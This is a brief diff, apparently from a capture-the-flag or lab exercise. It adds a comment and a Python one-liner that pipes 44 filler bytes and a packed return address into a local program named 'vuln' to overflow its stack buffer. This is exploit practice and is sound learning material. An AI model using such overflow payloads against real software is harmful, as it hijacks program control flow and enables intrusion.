@@ -1,0 +1,5 @@
+# We neeeded to overflow buffer based on memory addresses we are getting, so for this we will need to create a script
+
+
+
+python -c "import struct; print 'A'*44 + struct.pack('<I' , 0x080485cb)" | ./vuln
